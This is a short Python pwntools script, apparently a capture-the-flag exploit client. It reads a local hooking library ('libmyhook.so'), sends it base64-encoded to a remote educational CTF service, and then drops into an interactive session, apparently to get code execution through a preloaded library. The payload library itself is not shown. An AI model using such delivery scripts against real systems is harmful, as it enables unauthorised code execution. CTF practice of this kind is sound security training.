from base64 import b64encode
from pwn import *

ld_file = open('./libmyhook.so', 'rb').read()
# r = process(['python', './main.py'])
r = remote('edu-ctf.zoolab.org', 10002)

print(r.recvline())
raw_input()
r.sendline(b64encode(ld_file))
# print(b64encode(ld_file))

r.interactive()
